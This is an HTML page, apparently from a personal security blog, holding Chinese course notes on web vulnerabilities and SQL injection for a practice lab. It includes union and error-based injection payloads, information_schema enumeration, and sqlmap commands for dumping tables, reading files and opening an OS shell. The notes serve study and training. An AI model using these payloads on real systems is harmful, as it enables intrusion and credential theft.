@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>45 · Web漏洞概述与SQL注入 | tongui 的安全笔记</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="Web 漏洞概述与 SQL 注入 ⭐ 一句话总结:Web 渗透第一步是”对症下药”——先按 OWASP Top 10 和中间件&#x2F;框架漏洞找方向;SQL 注入是经典注入漏洞,核心是”用户输入被拼进 SQL 语句”,再配合报错注入、联合查询、sqlmap 等手法把数据库数据拿回来。  学习目标 掌握渗透测试阶段流程和 OWASP Top 10 会寻找 SQL 注入点并判断注入类型 掌握联合查">
+<meta property="og:type" content="website">
+<meta property="og:title" content="45 · Web漏洞概述与SQL注入">
+<meta property="og:url" content="https://tongui66.github.io/course-notes/chapter2-web-vulns/45-Web%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0%E4%B8%8ESQL%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="tongui 的安全笔记">
+<meta property="og:description" content="Web 漏洞概述与 SQL 注入 ⭐ 一句话总结:Web 渗透第一步是”对症下药”——先按 OWASP Top 10 和中间件&#x2F;框架漏洞找方向;SQL 注入是经典注入漏洞,核心是”用户输入被拼进 SQL 语句”,再配合报错注入、联合查询、sqlmap 等手法把数据库数据拿回来。  学习目标 掌握渗透测试阶段流程和 OWASP Top 10 会寻找 SQL 注入点并判断注入类型 掌握联合查">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-08-08T02:00:00.000Z">
+<meta property="article:modified_time" content="2026-08-08T01:54:51.759Z">
+<meta property="article:author" content="tongui">
+<meta property="article:tag" content="Web安全, 渗透测试, CTF, SQL注入, XSS, 内网渗透, 应急响应, 安全笔记">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="tongui 的安全笔记" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&family=Noto+Sans+SC:wght@400;500;600;700&display=swap" rel="stylesheet">
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-inner" class="inner">
+      <a href="/" id="logo" class="nav-logo">tongui 的安全笔记</a>
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+        
+          <a class="main-nav-link" href="/">首页</a>
+        
+          <a class="main-nav-link" href="/security-notes/">安全笔记</a>
+        
+          <a class="main-nav-link" href="/course-notes/">课程</a>
+        
+          <a class="main-nav-link" href="/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95">CTF题解</a>
+        
+          <a class="main-nav-link" href="/tools">工具</a>
+        
+          <a class="main-nav-link" href="/projects">项目</a>
+        
+          <a class="main-nav-link nav-resume" href="/resume">简历</a>
+        
+          <a class="main-nav-link" href="/about">关于我</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          
+            <a class="nav-icon" target="_blank" rel="noopener" href="https://github.com/tongui66"><span class="fa fa-github"></span></a>
+          
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS 订阅"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="搜索"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://tongui66.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="page-" class="h-entry article article-type-page" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/course-notes/chapter2-web-vulns/45-Web%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0%E4%B8%8ESQL%E6%B3%A8%E5%85%A5/index.html" class="article-date">
+  <time class="dt-published" datetime="2026-08-08T02:00:00.000Z" itemprop="datePublished">2026-08-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      45 · Web漏洞概述与SQL注入
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="Web-漏洞概述与-SQL-注入"><a href="#Web-漏洞概述与-SQL-注入" class="headerlink" title="Web 漏洞概述与 SQL 注入"></a>Web 漏洞概述与 SQL 注入</h1><blockquote>
+<p>⭐ <strong>一句话总结</strong>:Web 渗透第一步是”对症下药”——先按 OWASP Top 10 和中间件&#x2F;框架漏洞找方向;SQL 注入是经典注入漏洞,核心是”用户输入被拼进 SQL 语句”,再配合报错注入、联合查询、sqlmap 等手法把数据库数据拿回来。</p>
+</blockquote>
+<h2 id="学习目标"><a href="#学习目标" class="headerlink" title="学习目标"></a>学习目标</h2><ul>
+<li>掌握渗透测试阶段流程和 OWASP Top 10</li>
+<li>会寻找 SQL 注入点并判断注入类型</li>
+<li>掌握联合查询、报错注入、偏移量注入等手法</li>
+<li>理解加密注入、堆叠注入、中转注入、伪静态注入</li>
+<li>会用 sqlmap 自动化检测与取数</li>
+</ul>
+<h2 id="一、渗透测试阶段流程"><a href="#一、渗透测试阶段流程" class="headerlink" title="一、渗透测试阶段流程"></a>一、渗透测试阶段流程</h2><ul>
+<li>常规渗透:明确目标 → 信息收集 → 漏洞探测 → 漏洞验证 → 提取数据证明 → 信息分析 → 写报告。</li>
+<li>打点(授权攻击):发现漏洞后继续利用 → 提权 → 内网渗透。</li>
+<li>探测&#x2F;验证分工具和手工:<strong>工具探测快但准度低,手工验证准</strong>(主流组合)。</li>
+</ul>
+<h2 id="二、优先关注哪些漏洞"><a href="#二、优先关注哪些漏洞" class="headerlink" title="二、优先关注哪些漏洞"></a>二、优先关注哪些漏洞</h2><ol>
+<li><strong>中间件&#x2F;框架漏洞</strong>(WebServer、CMS):先查信息收集到的版本,到漏洞库(如创宇 Seebug)搜 CVE 编号,找漏洞复现文章、POC、EXP。<ul>
+<li>POC &#x3D; 漏洞检测脚本(证明有没有);EXP &#x3D; 漏洞利用工具(直接拿权限)。</li>
+</ul>
+</li>
+<li><strong>系统漏洞</strong>:一般只做版本+补丁核对,不主动打(容易打崩业务)。</li>
+<li><strong>OWASP Top 10</strong>:Web 应用最危险漏洞排行。</li>
+</ol>
+<h2 id="三、OWASP-Top-10-2021"><a href="#三、OWASP-Top-10-2021" class="headerlink" title="三、OWASP Top 10(2021)"></a>三、OWASP Top 10(2021)</h2><ol>
+<li>失效的访问控制(未登录&#x2F;越权访问)</li>
+<li>加密失败(敏感数据明文、弱加密)</li>
+<li>注入(SQL&#x2F;命令注入等,2017 前常年第一)</li>
+<li>不安全的设计(架构设计缺陷)</li>
+<li>安全配置错误(默认口令、目录浏览等)</li>
+<li>易受攻击和过时的组件(老版本组件)</li>
+<li>身份识别和认证失败</li>
+<li>软件和数据完整性故障(反序列化等)</li>
+<li>安全日志和监控失败</li>
+<li>服务端请求伪造 SSRF</li>
+</ol>
+<h2 id="四、SQL-注入原理与寻找注入点"><a href="#四、SQL-注入原理与寻找注入点" class="headerlink" title="四、SQL 注入原理与寻找注入点"></a>四、SQL 注入原理与寻找注入点</h2><p><strong>原理</strong>:程序把用户输入直接拼接进 SQL 语句,导致输入中的引号&#x2F;关键字被当作 SQL 语法执行。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 正常:SELECT * FROM users WHERE username=&#x27;vince&#x27;</span></span><br><span class="line"><span class="comment">-- 注入:SELECT * FROM users WHERE username=&#x27;&#x27; or 1=1 #&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>明显的注入点</strong>:登录、注册、搜索、留言板、评论、分页、排序、ID 参数。<br><strong>隐藏注入点</strong>:Cookie、User-Agent、Referer 等一切可能被后端拿去查数据库的参数 → 抓包逐参数测试。</p>
+<h2 id="五、URL-编码与注释符"><a href="#五、URL-编码与注释符" class="headerlink" title="五、URL 编码与注释符"></a>五、URL 编码与注释符</h2><ul>
+<li>键值对格式:<code>键=值&amp;键=值</code>;值中出现特殊符号会被 URL 编码(<code>%</code>+ASCII 十六进制)。</li>
+<li><strong>GET 请求 URL 中不允许空格</strong>:用 <code>+</code> 或 <code>%20</code> 代替;<code>#</code> 需用 <code>%23</code>。</li>
+<li>SQL 注释符:<code>#</code>(后不用空格)、<code>-- </code>(后必须有空格)。</li>
+<li>POST 请求体中空格、井号可直接使用,不受 URL 限制。</li>
+</ul>
+<h2 id="六、基础测试语句"><a href="#六、基础测试语句" class="headerlink" title="六、基础测试语句"></a>六、基础测试语句</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;          -- 加单引号,报语法错误 = 大概率存在注入点</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> #  <span class="comment">-- 永真,返回所有数据</span></span><br><span class="line"><span class="string">&#x27; or 1=2 #  -- 永假,返回空,用于对比</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> #  <span class="comment">-- 试探列数</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="七、联合查询注入"><a href="#七、联合查询注入" class="headerlink" title="七、联合查询注入"></a>七、联合查询注入</h2><ul>
+<li><code>union select</code> 要求<strong>前后列数一致</strong>,列数不一致会报错。</li>
+<li>用 <code>select 1,2,3</code> 补列;知道列数后把目标数据放在展示位上。</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select username,password from users #</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="八、报错注入-重点"><a href="#八、报错注入-重点" class="headerlink" title="八、报错注入(重点)"></a>八、报错注入(重点)</h2><p>适用:页面不回显查询结果,但<strong>会把数据库报错信息显示出来</strong>。</p>
+<p>常用函数:</p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>updatexml(1, concat(0x7e, 查询语句), 1)</td>
+<td>用错误 XPath 触发报错</td>
+</tr>
+<tr>
+<td>extractvalue(1, concat(0x7e, 查询语句))</td>
+<td>同上,查询型</td>
+</tr>
+<tr>
+<td>floor(rand()*2)</td>
+<td>取整,可制造主键冲突报错</td>
+</tr>
+<tr>
+<td>concat()</td>
+<td>字符串拼接,让报错信息完整</td>
+</tr>
+</tbody></table>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1, concat(0x7e, database()), 1) #</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x7e</span>, <span class="keyword">user</span>())) #</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>0x7e</code> 是 <code>~</code> 的十六进制,避免写引号冲突。</li>
+<li>常用内置信息:<code>database()</code> 库名、<code>user()</code> 用户、<code>version()</code> 版本。</li>
+</ul>
+<h2 id="九、information-schema-取库表列"><a href="#九、information-schema-取库表列" class="headerlink" title="九、information_schema 取库表列"></a>九、information_schema 取库表列</h2><p>MySQL 5.0+ 自带 <code>information_schema</code> 库,存所有库&#x2F;表&#x2F;列结构:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 1. 查当前库的表名</span></span><br><span class="line"><span class="string">&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables</span></span><br><span class="line"><span class="string">    where table_schema=&#x27;</span>pikachu<span class="string">&#x27; limit 0,1)),1) #</span></span><br><span class="line"><span class="string">-- 2. 查表的列名</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns</span><br><span class="line">    <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;pikachu&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">1</span>) #</span><br><span class="line"><span class="comment">-- 3. 查数据</span></span><br><span class="line"><span class="string">&#x27; and updatexml(1,concat(0x7e,(select username from users limit 0,1)),1) #</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>⭐ 重点:报错函数里 <code>concat</code> 不能拼接多行&#x2F;多列,必须用 <code>limit 0,1</code> 一条一条取。</p>
+</blockquote>
+<h2 id="十、偏移量注入"><a href="#十、偏移量注入" class="headerlink" title="十、偏移量注入"></a>十、偏移量注入</h2><ul>
+<li>适用:知道表名、不知道列名,且<strong>前面查询列数 &gt; 后面查询列数</strong>。</li>
+<li>原理:<code>union select 1,2,3...</code> 补列,再用 <code>select 1 from users</code> 前后移动,让目标数据恰好落在页面展示的列上。</li>
+<li>条件苛刻、效果差,了解原理即可。</li>
+</ul>
+<h2 id="十一、其他注入手法"><a href="#十一、其他注入手法" class="headerlink" title="十一、其他注入手法"></a>十一、其他注入手法</h2><table>
+<thead>
+<tr>
+<th>手法</th>
+<th>要点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>加密注入</td>
+<td>数据被前端加密(如 Base64):先解密 → 加 payload → 用同样方式加密再发;可从 JS 找加密逻辑</td>
+</tr>
+<tr>
+<td>堆叠注入</td>
+<td>分号分隔多条 SQL:<code>&#39;; insert into ...; #</code>,需要后端支持多语句</td>
+</tr>
+<tr>
+<td>中转注入</td>
+<td>自建中转页面&#x2F;脚本转发请求,方便统一加 payload、编码、绕过设备</td>
+</tr>
+<tr>
+<td>伪静态注入</td>
+<td>URL 被 rewrite 成 <code>.html</code> 伪静态,注入点藏在伪静态路径参数中</td>
+</tr>
+<tr>
+<td>二次注入</td>
+<td>恶意数据先存库,再在另一处被拼进 SQL(如注册用户名注入)</td>
+</tr>
+<tr>
+<td>宽字节注入</td>
+<td>针对 <code>addslashes</code> 转义,用 <code>%df&#39;</code> 吃掉反斜杠</td>
+</tr>
+</tbody></table>
+<h2 id="十二、盲注概念"><a href="#十二、盲注概念" class="headerlink" title="十二、盲注概念"></a>十二、盲注概念</h2><ul>
+<li>页面无变化(无回显)≠没有注入点;可能被过滤,也可能注入成功但响应被加工。</li>
+<li>盲注手段:基于布尔(页面真假变化)、基于时间(延时判断)、报错被隐藏时用 DNSlog 外带。</li>
+</ul>
+<h2 id="十三、sqlmap-自动化工具"><a href="#十三、sqlmap-自动化工具" class="headerlink" title="十三、sqlmap 自动化工具"></a>十三、sqlmap 自动化工具</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r request.txt          <span class="comment"># 用抓到的数据包文件(最常用,GET/POST/Cookie 都支持)</span></span><br><span class="line">python sqlmap.py -u <span class="string">&quot;http://x/?id=1&quot;</span>     <span class="comment"># 指定 GET URL</span></span><br><span class="line">--level 3      <span class="comment"># 测试等级(3 常用,会测 Cookie、UA、Referer)</span></span><br><span class="line">--risk 3       <span class="comment"># 风险等级(增加 or 语句等)</span></span><br><span class="line">-v 5           <span class="comment"># 显示详细请求/响应</span></span><br><span class="line">-p <span class="built_in">id</span>          <span class="comment"># 只测指定参数</span></span><br><span class="line">--threads 10   <span class="comment"># 线程数(默认 10,需考虑目标并发承受力)</span></span><br><span class="line">--dbs          <span class="comment"># 枚举数据库</span></span><br><span class="line">--current-user / --is-dba / --current-db</span><br><span class="line">--tables -D 库名</span><br><span class="line">--columns -D 库名 -T 表名</span><br><span class="line">--dump -D 库名 -T 表名 -C 列1,列2   <span class="comment"># 导出数据(结果存 output 目录)</span></span><br><span class="line">--file-read <span class="string">&quot;C:/1.txt&quot;</span>               <span class="comment"># 读取服务器文件</span></span><br><span class="line">--os-shell                           <span class="comment"># 交互式系统命令</span></span><br><span class="line">--file-write 本地文件 --file-dest 目标路径  <span class="comment"># 写文件</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>–os-shell 原理</strong>:先通过注入上传一个”文件上传功能”文件,再基于它上传真正的 WebShell 木马;木马通过 HTTP 收发命令(内部用 system&#x2F;exec&#x2F;passthru 等函数执行),结束会尝试自动删除文件。</li>
+<li>工具会大量发包:注意时间、线程数,别把目标打崩;抓包可以看到 sqlmap 的典型注入关键字。</li>
+</ul>
+<h2 id="十四、注入点利用思路"><a href="#十四、注入点利用思路" class="headerlink" title="十四、注入点利用思路"></a>十四、注入点利用思路</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">读数据(库/表/列/密码) → 后台管理员账号密码 → 登录后台</span><br><span class="line">读文件:load_file()  /  写文件:into outfile</span><br><span class="line">尝试 getshell(WebShell) → 免杀 → 提权 → 权限维持 → 内网渗透</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>⭐ 重点:<code>load_file()</code> 读文件、<code>into outfile</code> 写文件是 SQL 注入 getshell 的两个关键功能。</p>
+</blockquote>
+<h2 id="十五、重点速记"><a href="#十五、重点速记" class="headerlink" title="十五、重点速记"></a>十五、重点速记</h2><ul>
+<li>OWASP Top10:访问控制、加密失败、注入排前三</li>
+<li>注入点:所有被拼进 SQL 的参数,包括 Cookie&#x2F;UA</li>
+<li>URL 编码:空格→+、#→%23;注释 # 和 –(带空格)</li>
+<li>联合查询要列数一致;报错注入用 updatexml&#x2F;extractvalue + concat + limit</li>
+<li>information_schema:库名→表名→列名→数据</li>
+<li>加密&#x2F;堆叠&#x2F;中转&#x2F;伪静态&#x2F;二次&#x2F;宽字节注入各有场景</li>
+<li>sqlmap:-r 数据包、–level&#x2F;–risk、–dbs&#x2F;–tables&#x2F;–dump、–os-shell</li>
+</ul>
+<h2 id="自测题"><a href="#自测题" class="headerlink" title="自测题"></a>自测题</h2><ol>
+<li>OWASP Top 10 2021 排第一的是什么漏洞?</li>
+<li>怎么判断一个参数是否存在 SQL 注入点?</li>
+<li>GET 请求 URL 中的空格为什么变成加号?</li>
+<li><h1 id="和-–-注释有什么区别"><a href="#和-–-注释有什么区别" class="headerlink" title="和 – 注释有什么区别?"></a>和 – 注释有什么区别?</h1></li>
+<li>union select 注入的前提条件是什么?</li>
+<li>报错注入常用的函数有哪些?为什么要加 limit?</li>
+<li>information_schema 里查表名和列名用哪两张表?</li>
+<li>sqlmap 的 -r 和 -u 参数分别用于什么?</li>
+<li>–os-shell 的原理是什么?</li>
+<li>load_file 和 into outfile 是干什么的?</li>
+</ol>
+<details><summary>参考答案</summary>
+1. 失效的访问控制。<br>
+2. 加单引号看是否报语法错误,再用 or 1=1 / or 1=2 对比响应。<br>
+3. URL 中不允许空格,浏览器自动 URL 编码,空格编码为 + 或 %20。<br>
+4. # 后面不用空格,-- 后面必须有空格。<br>
+5. 前后查询的列数必须一致,可用 1,2,3 补列。<br>
+6. updatexml、extractvalue、floor;concat 不能拼接多行,用 limit 逐条取。<br>
+7. tables 表和 columns 表。<br>
+8. -r 用抓包数据包文件,-u 直接指定 GET 网址。<br>
+9. 先上传一个文件上传功能文件,再上传 WebShell 木马,通过 HTTP 执行命令。<br>
+10. load_file 读服务器文件,into outfile 向服务器写文件。<br>
+</details>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://tongui66.github.io/course-notes/chapter2-web-vulns/45-Web%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0%E4%B8%8ESQL%E6%B3%A8%E5%85%A5/index.html" data-id="cuidpJB7XHdzJZltAGbKq8sV1" data-title="45 · Web漏洞概述与SQL注入" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">SQL注入</a> <a href="/tags/SSRF/" style="font-size: 10px;">SSRF</a> <a href="/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/tags/XXE/" style="font-size: 10px;">XXE</a> <a href="/tags/%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">上传</a> <a href="/tags/%E4%BB%A3%E7%90%86/" style="font-size: 10px;">代理</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 10px;">信息收集</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 10px;">命令执行</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 10px;">域渗透</a> <a href="/tags/%E5%BA%94%E6%80%A5/" style="font-size: 10px;">应急</a> <a href="/tags/%E6%8A%A4%E7%BD%91/" style="font-size: 10px;">护网</a> <a href="/tags/%E6%8A%A5%E5%91%8A/" style="font-size: 10px;">报告</a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size: 10px;">提权</a> <a href="/tags/%E6%9F%A5%E6%9D%80/" style="font-size: 10px;">查杀</a> <a href="/tags/%E6%B5%81%E7%A8%8B/" style="font-size: 10px;">流程</a> <a href="/tags/%E7%AD%89%E4%BF%9D/" style="font-size: 10px;">等保</a> <a href="/tags/%E9%9A%A7%E9%81%93/" style="font-size: 10px;">隧道</a> <a href="/tags/%E9%9D%A2%E8%AF%95/" style="font-size: 10px;">面试</a> <a href="/tags/%E9%A2%98%E5%BA%93/" style="font-size: 10px;">题库</a> <a href="/tags/%E9%AB%98%E9%A2%91/" style="font-size: 10px;">高频</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">安全笔记</a><span class="category-list-count">5</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/Web%E6%BC%8F%E6%B4%9E/">Web漏洞</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E9%9D%A2%E8%AF%95/">面试</a><span class="category-list-count">1</span></li></ul></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/08/">八月 2026</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/06/">六月 2026</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/security-notes/interview-100/">面试高频问答 100 题</a>
+          </li>
+        
+          <li>
+            <a href="/security-notes/incident-response/">应急响应速查</a>
+          </li>
+        
+          <li>
+            <a href="/security-notes/intranet-domain/">内网渗透与域渗透速查</a>
+          </li>
+        
+          <li>
+            <a href="/security-notes/pentest-checklist/">渗透测试全流程速查</a>
+          </li>
+        
+          <li>
+            <a href="/security-notes/payload-handbook/">Web 漏洞速查与 Payload 手册</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2026 tongui<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/security-notes/" class="mobile-nav-link">安全笔记</a>
+  
+    <a href="/course-notes/" class="mobile-nav-link">课程</a>
+  
+    <a href="/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95" class="mobile-nav-link">CTF题解</a>
+  
+    <a href="/tools" class="mobile-nav-link">工具</a>
+  
+    <a href="/projects" class="mobile-nav-link">项目</a>
+  
+    <a href="/resume" class="mobile-nav-link">简历</a>
+  
+    <a href="/about" class="mobile-nav-link">关于我</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script>
+  (function(){
+    var path = location.pathname.replace(/\/+$/, '') || '/';
+    var links = document.querySelectorAll('#main-nav .main-nav-link');
+    var best = null, bestLen = -1;
+    for (var i = 0; i < links.length; i++){
+      var href = links[i].getAttribute('href') || '';
+      href = href.replace(/\/+$/, '') || '/';
+      var hit = (href === '/' ? path === '/' : (path === href || path.indexOf(href + '/') === 0));
+      if (hit && href.length > bestLen){
+        bestLen = href.length;
+        best = links[i];
+      }
+    }
+    if (best){
+      best.classList.add('current');
+    }
+  })();
+</script>
+
+
+
+
+
+
+  </div>
+</body>
+</html>
